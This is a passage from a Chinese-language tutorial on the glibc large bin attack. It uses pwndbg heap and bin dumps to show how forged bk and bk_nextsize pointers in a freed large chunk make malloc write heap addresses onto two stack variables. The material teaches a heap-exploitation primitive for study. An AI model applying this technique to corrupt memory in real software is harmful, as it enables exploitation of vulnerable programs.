      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603330 FASTBIN {
      prev_size = 0,
      size = 49,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603360 PREV_INUSE {
      prev_size = 0,
      size = 1041,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603770 FASTBIN {
      prev_size = 0,
      size = 49,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x6037a0 PREV_INUSE {
      prev_size = 0,
      size = 1041,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603bb0 FASTBIN {
      prev_size = 0,
      size = 49,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603be0 PREV_INUSE {
      prev_size = 0,
      size = 132129,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg>
这里我们继续吧,首先我们释放了P1,此时的bins
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603000
    smallbins
    empty
    largebins
    empty
然后我们释放了P2,此时的bins
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x603360 —▸ 0x603000 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603360 /* '`3`' */
    smallbins
    empty
    largebins
    empty
    pwndbg>
可以看到我们释放的两个chunk都被放到了unsorted bin中,因此我们再申请一个小chunk,系统就会把我们的第二个free
chunk丢到large bin中了
之后我们再康康我们现在unsorted bin中的chunk,这个chunk已经是被分割过的了
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6030a0
    smallbins
    empty
    largebins
    0x400: 0x603360 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x603360 /* '`3`' */
    pwndbg> x/10x 0x603000
    0x603000:       0x0000000000000000      0x00000000000000a1
    0x603010:       0x00007ffff7dd1e98      0x00007ffff7dd1e98
    0x603020:       0x0000000000000000      0x0000000000000000
    0x603030:       0x0000000000000000      0x0000000000000000
    0x603040:       0x0000000000000000      0x0000000000000000
    pwndbg> x/10gx 0x6030a0
    0x6030a0:       0x0000000000000000      0x0000000000000291
    0x6030b0:       0x00007ffff7dd1b78      0x00007ffff7dd1b78
    0x6030c0:       0x0000000000000000      0x0000000000000000
    0x6030d0:       0x0000000000000000      0x0000000000000000
    0x6030e0:       0x0000000000000000      0x0000000000000000
然后我们再运行一下,这里已经free了p3
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x6037a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6037a0
    smallbins
    empty
    largebins
    0x400: 0x603360 —▸ 0x7ffff7dd1f68 (main_arena+1096) ◂— 0x603360 /* '`3`' */
p3也被放入了unsortedbin中,这里我们开始伪造p2
    pwndbg> x/10gx 0x603360
    0x603360:       0x0000000000000000      0x00000000000003f1
    0x603370:       0x0000000000000000      0x00007fffffffe5b0
    0x603380:       0x0000000000000000      0x00007fffffffe5a8
    0x603390:       0x0000000000000000      0x0000000000000000
    0x6033a0:       0x0000000000000000      0x0000000000000000
先修改了size为0x3f1,然后fd为0,fd->nextsize为0,bk为&stack_var-2而bk_size为&stack_var2-4,也就是指向了同一个地址:)
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x6037a0 —▸ 0x6030a0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x6037a0
    smallbins
    empty
    largebins
    0x400 [corrupted]
    FD: 0x603360 ◂— 0x0
    BK: 0x603360 —▸ 0x7fffffffe5b0 ◂— 0x0
然后我们再malloc一下
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0
    0x80: 0x0
    unsortedbin
    all: 0x603140 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603140 /* '@1`' */
    smallbins
    empty
    largebins
    0x400 [corrupted]
    FD: 0x603360 ◂— 0x0
    BK: 0x603360 —▸ 0x6037a0 —▸ 0x7fffffffe5b0 ◂— 0x6037a0
此时目标已经被修改了
    pwndbg> x/10gx &stack_var1
    0x7fffffffe5c0: 0x00000000006037a0      0x00000000006037a0
    0x7fffffffe5d0: 0x0000000000603010      0x0000000000603370
    0x7fffffffe5e0: 0x00000000006037b0      0xd047b69e2685f100
    0x7fffffffe5f0: 0x0000000000400a30      0x00007ffff7a2d830
    0x7fffffffe600: 0x0000000000000000      0x00007fffffffe6d8
    pwndbg> x/10gx &stack_var2
    0x7fffffffe5c8: 0x00000000006037a0      0x0000000000603010
    0x7fffffffe5d8: 0x0000000000603370      0x00000000006037b0
    0x7fffffffe5e8: 0xd047b69e2685f100      0x0000000000400a30
    0x7fffffffe5f8: 0x00007ffff7a2d830      0x0000000000000000
    0x7fffffffe608: 0x00007fffffffe6d8      0x0000000100000000
    pwndbg> p/x stack_var1
    $20 = 0x6037a0
    pwndbg> p/x stack_var2
    $21 = 0x6037a0
###  总结
本例中,程序先是在栈上创建了两个变量stack_var1和stack_var2并赋初值为0,这两个变量就是即将要被覆写的变量
随后申请了一个large chunk p1,然后又申请了一个小chunk来避免后面的操作引发合并,之后又申请了一个large chunk
p2,之后还是一个避免合并的小chunk,下面申请p3的操作类似
随后程序释放了p1,p2,此时两个chunk被链入unsorted bin中
之后为了将p2放入large bin,程序又申请了一个小chunk对p1进行切割,一部分还给用户,一部分继续放进unsorted
bin中,然后系统将p2放入了large bin中
之后Free掉了p3,现在p3也在unsorted bin中
好了,现在程序伪造了p2的内容,将p2->bk_nextsize指向stack2-4,p2->bk指向stack1-2
再malloc一个小chunk,这个时候程序就会将p3放入large bin中,系统就会调用从unsorted bin中取出large
bin的操作,将堆地址存入了栈上
over~